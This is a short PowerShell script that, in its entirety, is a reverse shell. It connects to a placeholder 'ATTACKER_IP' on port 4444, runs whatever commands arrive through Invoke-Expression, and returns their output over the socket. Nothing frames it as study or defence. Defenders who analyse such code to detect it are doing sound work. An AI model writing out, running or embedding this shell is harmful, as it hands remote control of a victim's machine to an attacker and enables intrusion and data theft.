$ip = "ATTACKER_IP"
$port = "4444"
$client = New-Object System.Net.Sockets.TCPClient($ip, $port)
$stream = $client.GetStream()
$writer = New-Object System.IO.StreamWriter($stream)
$buffer = New-Object byte[] 1024
while (($bytes = $stream.Read($buffer, 0, $buffer.Length)) -ne 0) {
    $data = (New-Object -TypeName Text.ASCIIEncoding).GetString($buffer, 0, $bytes)
    $sendback = (Invoke-Expression -Command $data 2>&1 | Out-String )
    $writer.WriteLine($sendback)
    $writer.Flush()
}
$client.Close()
